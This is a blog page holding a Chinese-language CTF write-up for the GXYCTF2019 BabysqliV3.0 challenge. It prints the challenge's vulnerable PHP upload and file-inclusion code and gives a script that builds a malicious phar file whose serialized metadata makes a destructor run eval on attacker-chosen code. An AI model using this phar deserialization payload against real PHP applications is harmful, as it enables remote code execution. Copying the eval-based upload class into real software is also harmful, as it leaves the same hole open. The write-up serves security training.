@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[GXYCTF2019]BabysqliV3.0 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[GXYCTF2019]BabysqliV3.0</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 21, 2024&nbsp;&nbsp;12:16:34</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>文件包含获取源码：</p>
+<p>home.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">    if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">        if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">            die(&quot;hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">                $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;å½åå¼ç¨çæ¯ &quot;.$file;</span><br><span class="line">            require $file;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;no permission!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>upload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    ä¸ä¼ æä»¶</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸ä¼ &quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">    public $Filename;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $token;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;;</span><br><span class="line">        $ext = &quot;.txt&quot;;</span><br><span class="line">        @mkdir($sandbox, 0777, true);</span><br><span class="line">        if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#x27;name&#x27;]))&#123;</span><br><span class="line">            $this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;;</span><br><span class="line">        $this-&gt;token = $_SESSION[&#x27;user&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upload($file)&#123;</span><br><span class="line">        global $sandbox;</span><br><span class="line">        global $ext;</span><br><span class="line"></span><br><span class="line">        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">            $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            if($file[&#x27;size&#x27;] &gt; 1024)&#123;</span><br><span class="line">                $this-&gt;cmd = &quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                $this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        global $sandbox;</span><br><span class="line">        global $ext;</span><br><span class="line">        // return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">        return $this-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;</span><br><span class="line">            $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $uploader = new Uploader();</span><br><span class="line">    $uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">    if(@file_get_contents($uploader))&#123;</span><br><span class="line">        echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents($uploader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可操控的参数和命令执行函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br><span class="line"></span><br><span class="line">eval($this-&gt;cmd);</span><br></pre></td></tr></table></figure>
+
+<p>上传代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">        echo &quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo file_get_contents($uploader);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察了一下代码，发现应该是一个反序列化，但是有没有发现反序列化代码，确定是一道phar反序列化题目</p>
+<p>由于使用文件操作函数配合伪协议<code>phar://</code>读取文件可触发反序列化,从而导致 rce.</p>
+<p>基于这样的想法,这里便上传一个<code>.phar</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">        if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;</span><br><span class="line">            $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里还需要获得user的session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#x27;name&#x27;]))&#123;</span><br><span class="line">            $this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便上传个文件得到session</p>
+<p><img src="/../images/%5BGXYCTF2019%5DBabysqliV3.0/1.png" alt="1"></p>
+<p> 构造一下上传的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Uploader&#123;</span><br><span class="line">    public $Filename;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $token;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = new Uploader();</span><br><span class="line">$o-&gt;cmd = &#x27;phpinfo();&#x27;;#</span><br><span class="line">$o-&gt;token = &#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;;</span><br><span class="line">$phar = new Phar(&quot;payload.phar&quot;);</span><br><span class="line">$phar -&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(&quot;&lt;?php __HALT_COMPILER();?&quot;);</span><br><span class="line">$phar -&gt; setMetadata($o);</span><br><span class="line">$phar -&gt; addFromString(&quot;test.txt&quot;,&quot;you are hacked&quot;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>换一下cmd就行了。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/08/21/GXYCTF2019-BabysqliV3-0/">http://odiws.github.io/2024/08/21/GXYCTF2019-BabysqliV3-0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># phar反序列化</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/">[CISCN2019华东南赛区]Web4</a>
+            
+            
+            <a class="next" rel="next" href="/2024/08/19/bestphp-srevenge/">bestphp'srevenge</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
